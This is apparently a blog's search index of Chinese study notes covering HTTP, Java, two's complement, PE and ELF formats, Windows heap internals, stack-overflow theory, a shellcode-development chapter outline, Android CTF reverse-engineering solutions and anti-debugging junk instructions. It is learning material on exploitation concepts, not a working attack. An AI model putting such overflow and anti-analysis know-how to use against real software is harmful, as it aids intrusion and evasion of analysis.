Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息. GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中. GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制. GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。 GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码. 一个URL的请求过程：当你在浏览器输入URL http://www.website.com 的时候，浏览器发送一个Request去获取 http://www. website.com的html. 服务器把Response发送回给浏览器.浏览器分析Response中的 HTML，发现其中引用了很多其他文件，比如图片，CSS文件，JS文件。浏览器会自动再次发送Request去获取图片，CSS文件，或者JS文件。当所有的文件都下载成功后， 网页就被显示出来了。 分类 分类描述 1** 信息，服务器收到请求，需要请求者继续执行操作 2** 成功，操作被成功接收并处理 3** 重定向，需要进一步的操作以完成请求 4** 客户端错误，请求包含语法错误或无法完成请求 5** 服务器错误，服务器在处理请求的过程中发生了错误 最常用的响应状态码 ◆200 (OK): 找到了该资源，并且一切正常。 ◆301(Moved Permanently): 客户请求的文档在其他地方，新的URL在Location头中给出，浏览器应该自动地访问新的URL。 ◆302 (Found): 类似于301，但新的URL应该被视为临时性的替代，而不是永久性的。 ◆304 (NOT MODIFIED): 该资源在上次请求之后没有任何修改。这通常用于浏览器的缓存机制。 ◆400 (Bad Request): 请求出现语法错误。 ◆403 (FORBIDDEN): 客户端未能获得授权。这通常是在401之后输入了不正确的用户名或密码。 ◆404 (NOT FOUND): 在指定的位置不存在所申请的资源。 ◆500 (Internal Server Error): 服务器遇到了意料不到的情况，不能完成客户的请求 ◆503 (Service Unavailable): 服务器由于维护或者负载过重未能应答。例如，Servlet可能在数据库连接池已满的情况下返回503。服务器返回503时可以提供一个Retry-After头 工作流程 首先选取一部分精心挑选的种子URL； 将这些URL放入待抓取URL队列； 从待抓取URL队列中取出待抓取在URL，解析DNS，并且得到主机的ip，并将URL对应的网页下载下来，存储进已下载网页库中。此外，将这些URL放进已抓取URL队列。 分析已抓取URL队列中的URL，分析其中的其他URL，并且将URL放入待抓取URL队列，从而进入下一个循环。]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019/9/30]]></title>
    <url>%2F2019%2F09%2F20%2FJava%2F</url>
    <content type="text"><![CDATA[Java0.public是为了公开给其他类存取，class是声明类，Myfirst是类的名称。 main为方法名，String[] agrs表示传string的字符串给此方法当参数，命名为args。 Java的源文件为.java，编译之后的.class文件为可执行文件。 12345public class Myfisrt&#123; public static void main (String[] args)&#123; System.out.print(&quot;HelloWorld!&quot;); &#125;&#125; 1.for each循环 123456int[] ns =&#123;1,2,3&#125;for (int n :ns)&#123; System.out.println(n);//用于将数组中的元素遍历&#125; 2.Arrays.toString()函数 1234int[] ns = &#123;1,2,3&#125;System.out.println(Arrays.toString(ns));//此函数直接将数组中元素遍历 3.Arrays.sort()函数，对数组进行排序，参数为数组名。 4.Arrays.deepToString()用于打印二维数组的函数。 5.break会跳出当前循环，也就是整个循环都不会执行了。而continue则是提前结束本次循环，直接继续执行下次循环。 6.Substring(Beginindex，Endindex)函数，对字符串进行剪切。起始索引从零开始，结束索引从1开始。剪切第一个字符，则参数为0，1. 7.Java中的String一旦被定义就无法改变，只能重新定义一个变量来保存。 8.继承：当定义的新class包含了已有class的字段与方法时，即可使用继承(extends)实现代码复用。格式：class 新类名 extends 旧类名。前者称为父类，后者称为子类。 继承的类无法访问其父类的private字段与方法，除非把private改为protected，则可被其子类以及子类的子类访问。 一般情况下可以直接引用父类中的方法与字段，但如果父类没有默认的构造方法，子类就必须显式调用super(),并给出参数以便让编译器定位到父类的一个合适的构造方法。 9.注意String与string，Double与double的区别。 类与对象类的定义定义一个class [类修饰符] class [类名] [extends 父类，implements 接口]{ //成员变量 //成员方法 //构造器 //…… } 类修饰符：public，protected，private，abstract，static，final，strictfp。 成员变量声明成员变量： [修饰符] 数据类型 变量名 = [初始化值] 12345public class Student&#123; private String name; protected float score; String ID;&#125; 变量分类： 成员变量：类似C语言中全局变量，在整个类中都有效。 局部变量：在该代码块/该方法中有效。 参数变量：在该方法或catch代码块中有效。 变量修饰符： public protected private 设定成员变量的访问权限，无法修饰局部变量与参数变量 static 只能够修饰成员变量，不能够修饰局部变量与参数变量，由static修饰的成员变量为静态成员变量，反之为非静态成员变量（实例变量） final常量 transient 只能修饰成员变量，序列化时不会被保存 volatile 只能修饰成员变量，多线程相关 所有变量在声明时不用初始化，但在使用前必须初始化，否则编译错误。 成员方法 [修饰词] 返回类型 方法名 ([参数1，参数2，…]) [throws 异常]{ 方法实现 } setter方法和getter方法： 出于封装考虑，某些class的成员变量通常都声明为private变量，无法直接访问此对象的private属性，通常的做法就是：为private的成员变量声明public的访问接口，称为setter方法与getter方法。 setter： 命名方法：set+变量名，such as setName/setScore；setter方法用于赋值，返回类型都为void getter： 命名方法：get+变量名，such as getName/getScore ；getter方法用于取值，无需输入参数，但是返回类型一定是该成员变量的数据类型。 public protected private 访问控制修饰符，用于设定成员方法的访问权限 abstract 修饰的方法叫抽象方法， 抽象方法只有方法的声明部分， 没有方法体部 分，也就不提供方法的实现 重载Java允许同一个类中定义多个同名方法，只要其形参列表不同即可。如果一个类中包含了两个或者两个以上方法名相同的方法，但是形参列表不同，这种情况被称为重载overload。 方法重载的要求是同一个类中方法名相同，参数列表不同。方法的其他部分如返回值类型/修饰符等，与方法重载无关。实际调用时，根据实参的类型来决定调用哪一个方法。 Tips Java作为面向对象的语言，同样可以描述一个事物的多种形态。如Student类继承了Person类，一个Student的对象便既是Student，又是Person。 123456 Person ming = new Person(); ......class Person &#123; private String name; private int age;&#125; 对象与类相对应，第一行代码Person ming = new Person()相当于创建了一个名为ming的对象，具有name(String)和age(int)两种属性。]]></content>
  </entry>
  <entry>
    <title><![CDATA[堆溢出利用]]></title>
    <url>%2F2019%2F09%2F08%2F%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[堆与栈的区别：堆基础堆与栈的区别： 堆是一种在程序运行时动态分配的内存，所谓动态分配是指所需内存大小在程序设计时并不能事先决定，需要在程序运行时参考用户的反馈。 堆在使用时需要程序员使用专门的函数进行申请，如C语言中的malloc函数，是分配内存的函数，堆内存申请有可能成功，也有可能失败，这与申请的内存大小，机器性能和当前运行环境有关。 一般使用一个堆指针来使用申请得到的内存，读写释放都通过这个指针来完成。 使用完毕后需要把堆指针传递给堆释放函数回收这片内存，否则会造成内存泄露，典型的堆释放函数如free，delete。 现代操作系统的堆数据结构一般包括堆块与堆表两类： 堆块：出于性能的考虑，堆区的内存按大小组织成块，以块为单位进行标识，而不是以传统的字节进行标识。一个堆块包括两个部分：块首与块身。块首是一个堆块头部的几个字节，用来标识这个堆块自身的信息，如大小，是否闲置等。块身是紧跟随在块首后的部分，也是最终非陪给用户使用的数据区。 堆表，堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，包括堆块的位置，大小，是否被占用等等。（堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块，保证堆分配效率的关键。堆表的设计会采用二叉树等高级数据结构用于优化查找效率。 在Windows中，占用态的堆块被使用它的程序索引，而堆表只索引空闲的堆块。其中最重要的堆表有两种： 空闲双向链表Freelist/快速单向链表Lookaside 空闲双向链表空闲堆块的块首包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块大小不同，空表总共被分为128条(即指针数组中的每个元素包含一条双向链表)。 堆区一开始的堆表区中有一个128项的指针数组，被称为空表索引(Freelist Array),该数组的每一项包含两个指针，用于标识一条空表。 空表索引的第二项free[1]标识了堆中所有大小为16字节的空闲堆块，free[2]标识了堆中所有大小为24字节的空闲堆块，依次类推有：空闲堆块大小=索引项*8(字节)。 把空闲堆块按照大小不同链入不同的链表，可以方便堆管理系统高效检索指定大小的空闲堆块。空表索引的第一项(free[0]所标识的空表)比较特殊，这条双向链表标识了所有大于等于1024字节的堆块。 快速单向链表块表是Windows用来加速堆块分配而采用的一种堆表，块表之所以快，是因为这类单向链表中从来不会发生堆块合并(其中的空闲块块首被设置为占用态，以防止堆块合并)。 快表也有128条，组织结构与空表类似，但是其中的堆块按照单链表组织。块表总是被初始化为空，并且每条快表最多有四个节点，所以很快就会被填满。 堆块分配/堆块释放/堆块合并（Coaleace)分配与释放是在程序提交与执行的，合并是由堆管理系统自动完成的。 堆块分配堆块分配可以分成三类：块表分配，普通空表分配和零号空表分配。 快表分配比较简单，包括寻找到大小匹配的空闲堆块(只有精准匹配时才会使用快表分配，故不存在对块的分割操作)，将其状态修改为占用态，将它从堆表中卸下，最后返回一个指向堆块块身的指针给程序使用。 普通空表分配时，首先寻找最优的空闲块进行分配，再寻找次优的空闲块进行分配，一直寻找到最小能够满足要求的空闲块。？？？？最优到底指的是以什么为标准。 零号空表中，按照大小升序链接大小不同的空闲块，故在分配内存的时候会反向查找最后一个(即链表中最大的一个堆块)，看能否满足要求。如果满足要求，则确定能够成功分配。再从第一个堆块开始从小到大正向搜索最小能够满足条件的堆块(零号空表升序排列的原因)。 当无法找到匹配的最优堆块时(大小完全精准符合)，一个稍大一些的堆会用于分配。这种次优分配发生时，会先从大块中按照请求的大小精准地割出一块进行分配，然后剩下的部分重新分配块首，链入空表，再次可以被索引到。 此处没有考虑堆缓存(heap cache)，低碎片堆(LFH)与虚分配。 堆块释放堆块释放的操作包括将堆块状态改为空闲，链入相应的堆表。所有释放块都链入堆表的末尾，分配的时候也从堆表末尾拿。特殊强调：快表最多有4项。 堆块合并经过反复的申请与释放操作，内存中的堆区可能会产生很多内存碎片。为了合理有效地利用内存，堆系统还能够进行堆块合并操作：当堆管理系统发现两个堆块相邻的时候，就会进行堆块合并操作。 堆块合并包括将两个块从空闲链表中卸下，合并堆块，调整合并后大块的块首信息，将新块重新链入空闲链表。并且对于小于1KB的小块，大于等于1KB小于512KB的大块，大于等于512KB的巨块，有不同的分配与释放的算法，此处不做深入了解，二周目的时候再调试。 堆分配函数之间的调用关系Windows中许多类型的堆分配函数最终都将使用位于ntdll.dll中的RtlAllocateHeap()函数进行分配，这个函数也是在用户态能够看到的最底层的堆分配函数。 调试堆的方法调试栈不同，调试堆时如果直接用OD，Windbg加载程序，会被堆管理函数检测到当前进程处于调试状态。而使用调试态的堆管理策略，调试态的堆管理与常态的堆管理有很大差异： 调试态堆不适用快表，只使用空表分配(我知道这只是演习)。 所有的堆块都被加上了多余的16字节尾部(8个字节的0xAB与8个字节的0x00)用来防止溢出(防止程序溢出而非堆溢出攻击)。 块首的标志不同。 Debug版本与Release版本的区别 Debug通常称为调试版本，通过一系列编译选项的配合，编译的结果通常包含调试信息，但是不做任何优化（性能有影响），目的是为开发人员提供强大的应用程序调试能力，也就是说只有在Debug模式下，我们才可以使用vs所提供的所有的程序调试功能，比如：单步调试中将光标移至变量处即可以获取该变量的实时数据。 Release通常称为发布版本，是为用户使用的，一般客户不允许在发布版本上进行调试，在Release模式下也无法使用vs所有的调试功能。所以不保存调试信息，同时，它往往进行了各种优化，以期达到代码最小和速度最优。为用户的使用提供便利。 调试态的堆就像debug版本的PE,常态堆就像release版本的PE，为了避免程序检测出调试器而使用调试态堆管理策略，我们可以在创建堆之后加入一个人工断点:_asm int 3,然后让程序单独执行。程序把堆初始化后，再用调试器attach进程，就能够看到真实的堆。、 堆分配算法依赖于操作系统版本，编译器版本，编译选项，bulid类型等因素，甚至与虚拟机版本有关。实验环境不恰当，将得到不同的调试结果。难搞啊]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开发shellcode的艺术]]></title>
    <url>%2F2019%2F09%2F08%2F%E5%BC%80%E5%8F%91shellcode%E7%9A%84%E8%89%BA%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[Shellcode:缓冲区溢出攻击中植入进程的代码 Exploit:计算函数返回地址距离缓冲区的偏移并覆盖，选择指令的地址，最终制作出一个由攻击效果，承载着shellcode的输入字符串位Exploit。 exploit一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他输入，其核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode。与shellcode一定的通用性不同，exploit一般是针对特定漏洞的。 Metasploit通用漏洞测试平台：规范化exploit和shellcode之间的接口，把漏洞利用的过程封装成易用的模块，实现了代码重复利用和模块化，结构化的思想。在这个平台中： 所有的exploit都使用漏洞名称来命名，里面包含有这个漏洞的函数返回地址，所使用的跳转指令等关键信息。 将常用的shellcode(例如用于绑定端口反向连接，执行任意命令)封装成一个个通用的模块，与任意漏洞的Exploit进行组合。 今天电脑不是一般地卡，第二章该调试的操作都还没练习过，这对于学习来说是非常危险的，第三章shellcode开发也得静下心研究。 0X00:定位shellcode 栈帧移位与jmp esp 获取跳板地址 使用跳板定位exploit 0X01:缓冲区的组织 缓冲区的组成 抬高栈顶保护shellcode 使用其他跳转指令 不使用跳转指令 函数返回地址移位 0X02:开发通用的shellcode 定位API的原理 shellcode的加载与调试 动态定位API地址的shellcode 0X03：shellcode编码技术 为什么要对shellcode编码 会变形的shellcode 0X04:简化shellcode]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机基础知识]]></title>
    <url>%2F2019%2F09%2F08%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[数的存储一直对计算机中数的存储方式一知半解，make a summary today。 source：为什么-1在计算机中的存储是0XFFFFFFFF? 负整数用补码(Two’s-complement)表示的数学原理是:一个整数的补码是其加法逆元（如果将一个数与其加法逆元相加，其结果为0）。 0X00:原码，反码，补码原码表示法规定：用符号位和数值位两部分表示一个带符号数，设字长为n位，最高位为符号位，正数的符号位用0表示，负数的符号位用1表示。其余n-1位数值部分用二进制形式表示。在原码中，零有两种表示形式，00000000为+0，10000000为-0. 原码所能表示的数的范围与二进制的位数(即机器字长)有关，由8位二进制数表示到由16位二进制数表示，能够表示的范围会增大。 反码表示法规定：正数的反码与原码相同，负数的反码是对该数的原码除符号位外各位取反。 补码表示法规定：正数的补码与原码相同，负数的补码是对该数的原码除符号位外各位取反后最末位+1.十六进制数的补码，就是将一个十六进制整数按位取反并+1.简单的方法就是用15减去该数字，最后再+1. 零的补码是唯一的：00000000 补码所能表示的数的范围与二进制的位数(即机器字长)有关，由8位二进制数表示到由16位二进制数表示，能够表示的范围会增大。 任何一个数的补码的补码即是其原码本身。 几种进制（有符号/无符号之间的转换）有符号二进制整数到十进制的转换如果最高位是1，则该数是补码，再次对其求补，得到其正数值。然后把这个数看成一个无符号二进制数，并求它的十进制值。 如果最高位是0，就将其视为无符号二进制整数，并转换为十进制数。 （先辨别了是否是负数） 有符号十进制数到二进制的转换把十进制整数的绝对值转换成二进制数 如果初始十进制数是负数，则在第一步的基础上求其补码。 （先把二进制数表示出来（与数字无关），再判断是否是负数） 有符号十进制数到十六进制的转换把十进制整数的绝对值转换成十六进制数 如果初始十进制数是负数，则在第一步的基础上求其补码。 有符号十六进制数到十进制的转换如果十六进制整数是负数，求其补码，否则保持不变。 把第一步得到的数转换成十进制。如果初始值是负数，则在十进制数前面加上负号。 通过检查十六进制数的最高有效位，就可以知道该十六进制数是正数还是负数。如果最高位&gt;=8,则该数是负数。如果最高位&lt;=7，则该数是正数。 普遍规律：根据符号是否对数字产生影响，若产生影响(负数十六进制/二进制），求其补码。进制转换后再根据初始正负加符号。若不产生影响，（正数十六进制/二进制，任意十进制），直接进制转换，再看初始正负。 句柄进程协程]]></content>
      <tags>
        <tag>底层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基础知识&栈溢出原理与实践]]></title>
    <url>%2F2019%2F09%2F05%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[0X00:基础知识PE文件概述：PE是Win32平台下的可执行文件遵守的数据格式，常见可执行文件如.exe/.dll都属于PE文件，PE文件格式规定了二进制的机器代码和字符串，菜单，图标等其他信息在可执行文件中如何组织。程序被执行时，系统会按照PE文件格式的约定去准确地定位各种资源，并将其加载入内存的不同区域。 PE文件格式把可执行文件分割成多个数据节(section) .text，由编译器产生，存放着编译产生的二进制机器代码，反汇编和调试的对象。 .data,初始化的数据块，宏定义，全局变量，静态变量。 .idata,所执行的动态链接库等外来函数与文件的信息。 .rsrc,存放程序的资源，如图标，菜单等。 虚拟内存：Windows的物理内存比较复杂，Windows内核Ring0级别才能看到。通常在用户模式下，用调试器看到的内存都是虚拟内存。每个进程都被分配了4GB的内存空间，实际上能够用到的内存空间没有那么多。内存管理器分配给了进程一片假地址/虚拟地址，只有当需要进行实际的内存操作时，内存管理器才会把虚拟地址与物理地址联系起来。 一个512MB的虚拟内存，能够映射出几个进程4GB的虚拟内存，关键在于这几个进程实际用到的内存之和小于512MB. PE文件与虚拟内存之间的映射：1.静态反汇编工具显示的某条文件的指令是相对于磁盘文件而言的，即文件偏移。我们还可能想知道虚拟内存地址VA。 2.动态调试时看到的某条指令是虚拟内存地址，经常需要回到PE文件找到这条指令的机器码。 四个概念：注意是在内存中还是在PE文件中 1.文件偏移地址(File Offset)静态 数据在PE文件中的地址叫做文件偏移地址，是文件在磁盘上存放时，相对于文件开头的偏移。 2.装载基址(Image Base)动态 PE装入内存中时的基地址，默认情况下装载基址为0X00400000，DLL文件的装载基址是0X10000000. 3.虚拟内存地址(Virtual Address)动态 PE文件中的指令被装入内存之后的地址。 4.相对虚拟地址(Relative Virtual Adress)动态 相对虚拟地址是内存地址相对于映射基址的偏移量。 所以有VA=Image Base+RVA 默认情况下将PE文件的0字节映射到虚拟内存的0x00400000，这个地址就是装载基址。 文件偏移是相对于文件开始处0字节的偏移，RVA是相对于装载基址0x00400000的偏移。 操作系统在装载PE文件时基本上保持PE文件中的各种数据结构，所以文件偏移地址和RVA相对虚拟地址有很大的一致性。不完全一致是因为文件数据的存放单位和内存数据的存放单位不同。 PE文件中的数据在未装载入内存之前，按照磁盘数据存放，以0X200字节为单位。当一个数据节(section)不足0X200时，不足的部分将被0X00填充。所以PE数据节的大小永远是0X200的整数倍。 PE文件中的数据被装载入内存之后，按照内存数据的标准以0X1000为单位进行存放，所以内存中的数据节大小永远是0X1000的整数倍。 由于数据在PE文件和内存中的存储单位不同，所以文件偏移和RVA只是”有很大的一致性”。由于上述差异，进行文件偏移到虚拟内存地址之间的转换要看所转换的地址属于第几个节内(在数据节的前面还是后面)。 文件偏移地址=虚拟内存地址VA-装载基址(Image Base)-节偏移=RVA-节偏移。 0X01:栈溢出原理与实战内存四区(注意是内存不是PE文件)： 代码区：存储被装入执行的二进制机器代码，CPU从这个区域取指令执行。 数据区：存储全局变量等。 堆区：进程在堆区动态地请求一定大小的内存，并在用完之后free。动态地分配和回收是堆区的特点。 栈区：用于动态地存储函数之间的调用关系。 系统栈是对内存中所有栈的统称，栈帧是指一个函数开辟出的栈空间。严格来说，栈帧底部和栈底部不是同一概念。所以在对EBP进行说明时：它指向当前位于系统栈最上边一个栈帧的底部，而不是系统栈的底部。ESP所指的栈帧底部与系统栈底部是同一位置。 在函数栈帧中，包含： 局部变量：为函数局部变量开辟的内存空间。 栈帧状态值：保存前栈帧的顶部和底部(实际上只保存底部，前栈帧的顶部可以通过堆栈平衡计算得到？。)，用于在本栈帧被弹出后恢复上一个栈帧。 函数返回地址：保存当前函数调用前的EIP信息(不准确？)就是函数调用前的指令位置，即函数调用前的指令位置，这样函数返回时能够恢复到函数被调用前的代码区中继续执行指令。 函数的栈帧大小并不确定，与其对应的局部变量的多少有关。在调试过程中也能发现，在函数运行的过程中，其栈帧大小也在不断变化。 函数调用的过程包含以下几个步骤： 参数入栈：将参数从右向左依次压入系统栈中。 返回地址入栈：将当前代码区调用指令的下一条指令压入栈中，待函数返回时pop出返回地址为EIP指向继续执行。 代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。 栈帧调整： PUSH EBP(保存当前栈帧状态值，备后面回复本栈帧时使用) MOV EBP,ESP(将当前栈帧切换到新栈帧，更新栈帧底部) SUB ESP,XXX(给新栈帧分配空间,抬高栈顶) 函数的返回过程包含如下几个步骤： 保存返回值：通常将函数的返回值保存在寄存器EAX中 弹出当前栈帧，恢复上一个栈帧，具体如下： 在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前的栈空间。 将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复上一个栈帧。 将函数返回地址弹给EIP寄存器。 4.最后一步——跳转：按照函数返回地址跳回母函数中继续执行。 注意CALL指令和RETN指令的实际操作 我的误区： 返回地址和EBP并不是同一概念与功能。CALL指令之后，先将返回地址压入栈中再PUSH EBP(旧栈帧)，EBP对函数返回并无任何贡献。 MOV EBP,ESP指令并不会对已经存放在栈中的EBP的值进行改变，是对寄存器EBP的值进行改变。注意当前栈帧保存的EBP值永远是前栈帧的EBP。 压入栈中的EBP目的在于使执行完函数后，栈底恢复到上一个状态。压入栈中的返回地址目的在于使执行完函数后，EIP恢复到函数调用前的状态，继续沿main函数执行 关于栈帧的划分，在不同书中有不同的约定。本书中坚持栈帧底部存放前栈帧EBP,栈帧顶部存放返回地址。 在观察内存的时候应该注意”内存数据”与”数值数据”的区别。在调试环境中，内存由低到高分布，就像Win32系统在内存中由低位向高位存储一个四字节的双字(Dump窗口的十六进制两位)，但是在作为”数值数据”应用的时候，是由高位字节向低位字节进行解释的。所以在调试环境中，内存数据中的双字与我们通常使用的数值数据是以双字为单位逆序过的。出于阅读方便，OD已经自动在栈中进行了反转，在栈窗口所看到的数据是数值数据而非内存数据。所以在栈内看数据时，从左向右对于左边的地址偏移依次为3，2，1，0.]]></content>
      <tags>
        <tag>0day安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git的大小写问题]]></title>
    <url>%2F2019%2F09%2F05%2FGit%E7%9A%84%E5%A4%A7%E5%B0%8F%E5%86%99%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[使用 Hexo 部署博客到 Github Pages 时经常会遇到文件夹大小写问题导致的 404问题，如tag标签无法访问返回404。 原因 git 默认忽略文件名大小写，所以即使文件夹大小写变更，git 也检测不到。 解决办法 进入到博客项目中 .deploy_git文件夹，修改 .git 下的 config 文件，将 ignorecase=true 改为 ignorecase=false。]]></content>
      <tags>
        <tag>报错</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Android逆向入门]]></title>
    <url>%2F2019%2F08%2F31%2FAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[关于Android逆向解题过程的总结 0X00:功能测试首先将APK文件拖入模拟器中，测试其功能，根据弹出的字符串，寻找解题的突破口。 0X01:主活动首先通过Androidmanifest.xml的找到Mainactivity，再对其中的代码进行逆向分析。 0X02:特殊情况隐藏mainactivity 0X03:几种工具的优势能够显示出被调用过的函数 0X04:具体题目攻防世界APP1： 首先用jadx打开，寻找到其中的Androidmanifest.xml，通过intent-filter找到主活动。 对Java代码进行分析 找到关键代码 通过Buildconfig找可能有用的信息，如该题中的versionName和versionCode，分别为X&lt;cP[?PHNB&lt;P?aj和15. charAt(i)函数，输出字符串中的第i个数字。可知这句代码的意思是：将输入字符串的第1~i个字符分别和versionCode与versionName异或之后的结果进行相等比较。如果不相等的话，输出”再接再厉，加油！” 于是Python脚本如下： s=”X&lt;cP[?PHNB&lt;P?aj” flag=” “ for i in s: ​ flag+=chr(ord(i)^15)//将s中的字符逐个转化为数字，与15进行异或后，再以字符形式输出。 ​ print(flag) 攻防世界App2： 观察程序功能 jadx打开 由第一个活动传到了第二个活动,观察到： 进入这个class 可见是native层的调用 于是改apk后缀为zip对.so进行分析，找到其中的lib，任意对其中一项分析。 可见是AES thisisateatkey== 作为密钥解密得：]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux ELF]]></title>
    <url>%2F2019%2F08%2F21%2FLinux-ELF%2F</url>
    <content type="text"><![CDATA[Linux 可执行文件格式 ELF （Executable Linkable Format）文件的三种类型： 可重定位文件（Relocatable file） 包含了代码和数据，可以和其他目标文件链接生成一个可执行文件或共享目标文件。 elfDemo.o 可执行文件（Executable File） 包含了可以直接执行的文件。 elfDemo_static.out 共享目标文件（Shared Object File） 包含了用于链接的代码和数据，分两种情况。一种是链接器将其与其他的可重定位文件和共享目标文件链接起来，生产新的目标文件。另一种是动态链接器将多个共享目标文件与可执行文件结合，作为进程映像的一部分。 elfDemo.out libc-2.25.so 可以看到，在这个简化的 ELF 文件中，开头是一个“文件头”，之后分别是代码段、数据段和.bss段。程序源代码编译后，执行语句变成机器指令，保存在.text段；已初始化的全局变量和局部静态变量都保存在.data段；未初始化的全局变量和局部静态变量则放在.bss段。 把程序指令和程序数据分开存放有许多好处，从安全的角度讲，当程序被加载后，数据和指令分别被映射到两个虚拟区域。由于数据区域对于进程来说是可读写的，而指令区域对于进程来说是只读的，所以这两个虚存区域的权限可以被分别设置成可读写和只读，可以防止程序的指令被改写和利用。 ELF 文件结构 ELF 文件头（ELF Header） 在目标文件格式的最前面，包含了描述整个文件的基本属性。 程序头表（Program Header Table） 是可选的，它告诉系统怎样创建一个进程映像。可执行文件必须有程序头表，而重定位文件不需要。 段（Section） 包含了链接视图中大量的目标文件信息。 段表（Section Header Table） 包含了描述文件中所有段的信息。]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反静态调试]]></title>
    <url>%2F2019%2F07%2F21%2F%E5%8F%8D%E9%9D%99%E6%80%81%E8%B0%83%E8%AF%95%2F</url>
    <content type="text"><![CDATA[反调试：插入代码，让程序意识到自己在被调试时，执行代码阻止调试器的分析，延长调试的时间。通过改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试的时间和复杂度。 0X00:IDA中的反反调试F5之后IDA报错，红色显示：”sp-analysis failed”(IDA有栈跟踪的功能，它在函数内部遇到ret(retn)指令时会做判断：栈指针的值在函数的开头/结尾是否一致，如果不一致就会在函数的结尾标注”sp-analysis failed”。),说明栈指针未平衡。通过”Options-General-Disassembly-“Stack pointer”显示出栈指针。之后Alt+K进行修改，将Call之前的栈指针减去0X04就得到正确的数值。 0X01:花指令插入花指令或者垃圾代码可以保护自己的代码 asm的作用：用于调用内联汇编程序，并且可在 C 或 C++ 语句合法时出现， asm后跟一个程序集指令、一组括在大括号中的指令或者至少一对空大括号。emit指令的作用： 编译器不认识的指令，拆成机器码来写。 插入垃圾字节来反跟踪，又称花指令。 __ams { ​ lea eax,lab1; ​ jmp eax; ​ _emit 0x90; } lab1: ​ printf(“func1\n”); 0X02：某些函数在使用 f5 进行反编译时，会提示错误 “sp-analysis failed”，导致无法正确反编译。原因可能是在代码执行中的 pop、push 操作不匹配，导致解析的时候 esp 发生错误。 解决办法步骤如下： 用 Option-&gt;General-&gt;Disassembly, 将选项 Stack pointer 打钩 仔细观察每条 call sub_xxxxxx 前后的堆栈指针是否平衡 有时还要看被调用的 sub_xxxxxx 内部的堆栈情况，主要是看入栈的参数与 ret xx 是否匹配 注意观察 jmp 指令前后的堆栈是否有变化 有时用 Edit-&gt;Functions-&gt;Edit function…,然后点击 OK 刷一下函数定义]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python's error]]></title>
    <url>%2F2019%2F07%2F18%2FPython-s-error%2F</url>
    <content type="text"><![CDATA[报错1:Exception:Traceback (most recent call last): File “/usr/lib/python2.7/dist-packages/pip/basecommand.py”, line 209, in main status = self.run(options, args) File “/usr/lib/python2.7/dist-packages/pip/commands/install.py”, line 328, in run wb.build(autobuilding=True) File “/usr/lib/python2.7/dist-packages/pip/wheel.py”, line 748, in build self.requirement_set.prepare_files(self.finder) File “/usr/lib/python2.7/dist-packages/pip/req/req_set.py”, line 360, in prepare_files ignore_dependencies=self.ignore_dependencies)) File “/usr/lib/python2.7/dist-packages/pip/req/req_set.py”, line 512, in _prepare_file finder, self.upgrade, require_hashes) File “/usr/lib/python2.7/dist-packages/pip/req/req_install.py”, line 273, in populate_link self.link = finder.find_requirement(self, upgrade) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 442, in find_requirement all_candidates = self.find_all_candidates(req.name) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 400, in find_all_candidates for page in self._get_pages(url_locations, project_name): File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 545, in _get_pages page = self._get_page(location) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 648, in _get_page return HTMLPage.get_page(link, session=self.session) File “/usr/lib/python2.7/dist-packages/pip/index.py”, line 757, in get_page “Cache-Control”: “max-age=600”, File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 480, in get return self.request(‘GET’, url, *kwargs) File “/usr/lib/python2.7/dist-packages/pip/download.py”, line 378, in request return super(PipSession, self).request(method, url, *args, *kwargs) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 468, in request resp = self.send(prep, *send_kwargs) File “/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.py”, line 576, in send r = adapter.send(request, *kwargs) File 